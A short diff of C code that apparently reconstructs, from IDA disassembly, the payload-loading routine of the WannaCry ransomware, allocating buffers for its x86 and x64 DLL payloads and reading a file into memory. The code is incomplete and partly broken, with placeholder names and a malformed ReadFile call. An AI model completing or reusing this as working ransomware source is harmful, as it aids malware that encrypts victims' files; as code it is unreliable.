@@ -25,14 +25,19 @@ int xor_payload(int xor_key, int buf, int size)
 }
 
 //init the DLL payload here
+//read from Wannacry in IDA
+//also here: https://www.acronis.com/en-us/blog/posts/wannacry-attack-what-it-and-how-protect-your-computer
 int initialize_payload()
 {
+	DWORD NumberOfBytesRead;
 	DWORD fileSize;
 	//size = 0x4060
 	HGLOBAL hMemory_x86 = GlobalAlloc(GMEM_ZEROINIT, UNKNOWN);
+	//converted to decimal: 16480
 	
 	//size = 0xc8a4
-	HGLOBAL hMemory_x646 = GlobalAlloc(GMEM_ZEROINIT, UNKNOWN);
+	HGLOBAL hMemory_x64 = GlobalAlloc(GMEM_ZEROINIT, UNKNOWN);
+	//converted to decimal: 51364
 	
 	if(something_happens_here)
 	{
@@ -40,11 +45,13 @@ int initialize_payload()
 		if(fileHandle != INVALID_FILE_HANDLE)
 		{
 			fileSize = GetFileSize(fileHandle, NULL);
-			abort();
+			ReadFile(fileHandle, EXE_BUFFER_SOMEWHERE, &fileSize, &NumberOfBytesRead, 0);
+    			CloseHandle(fileHandle);
+			
 		}
 		GlobalFree(hMemory_x86);
-		GlobalFree(hMemory_x646);
-		return NULL;
+		GlobalFree(hMemory_x64);
+		abort(); // or return NULL;
 	}
 }
 
